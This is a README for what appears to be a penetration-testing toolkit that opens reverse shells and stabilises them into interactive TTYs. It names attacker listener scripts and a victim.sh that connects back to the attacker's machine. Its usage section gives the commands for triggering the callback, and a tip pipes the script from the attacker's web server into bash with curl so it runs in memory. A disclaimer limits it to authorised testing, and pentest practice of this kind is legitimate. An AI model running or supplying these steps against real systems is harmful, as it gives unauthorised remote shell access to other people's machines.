
# 🚀 TTY Shell Stabilizer Toolkit
A collection of scripts to automate the setup of fully interactive TTY environments. These tools handle IP discovery, port listening, and terminal stabilization (Tab-completion, arrow keys, and job control) in one go.
## 📂 Script Overview

| Script | Role | Method |
|---|---|---|
| python_tty.sh | Attacker | Uses Python 3/2 pty module (Primary Choice). |
| bash_tty.sh | Attacker | Uses util-linux script command (Universal Fallback). |
| victim.sh | Victim | Executes the connection back to the attacker. |

------------------------------
## 🛠 Usage Instructions## 1. Start the Listener (Attacker Side)
Choose the script based on what you expect to find on the victim's machine.
If the victim has Python installed:

./python_tty.sh <port>

If the victim is a minimal system (No Python):

./bash_tty.sh <port>

The script will automatically detect your local IP and display the command the victim needs to run.
------------------------------
## 2. Trigger the Connection (Victim Side)
Once the listener is active, run the following on the target machine:

./victim.sh <attacker_ip> <port>

Example:
If your Kali IP is 10.0.13.7 and you are listening on 4444:

chmod +x victim.sh
./victim.sh 10.0.13.7 4444

------------------------------
## 💡 Quick Tips## Execution without Uploading (victim.sh)
If you cannot upload the victim.sh file to the target, you can host it on your Kali machine and pipe it directly to bash:

   1. Host it: python3 -m http.server 80
   2. Execute in memory:
   
   curl http://<your_ip>/victim.sh | bash -s -- <your_ip> <port>
   
   
## Terminal Recovery
If the connection drops and your Kali terminal feels "broken" (no text appears when you type), simply type:

reset

This will restore your terminal's normal behavior.
------------------------------
Disclaimer: For authorized security testing and educational purposes only.

